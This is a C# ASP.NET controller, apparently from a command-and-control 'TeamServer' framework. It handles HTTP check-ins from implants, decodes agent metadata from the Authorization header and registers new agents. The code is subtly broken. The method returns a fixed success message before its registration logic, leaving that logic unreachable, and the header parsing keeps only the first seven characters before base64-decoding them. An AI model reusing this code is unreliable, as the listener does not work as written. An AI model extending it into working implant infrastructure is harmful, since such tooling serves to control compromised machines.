using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System.Text;
using TeamServer.Services;

namespace TeamServer.Models.Listeners
{

    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents) {
            _agents = agents;
        }

        public IActionResult HandleImplant() {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata is null) {
                return NotFound();
            }
            var agent = _agents.GetAgent(metadata.Id);
            return Ok("Your listener is working.");
            if (agent is null) {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }
        }

        private AgentMetadata ExtractMetadata(IHeaderDictionary headers) {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata)) {
                return null;
            }

            encodedMetadata = encodedMetadata.ToString().Substring(0, 7);
            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }

    }
}
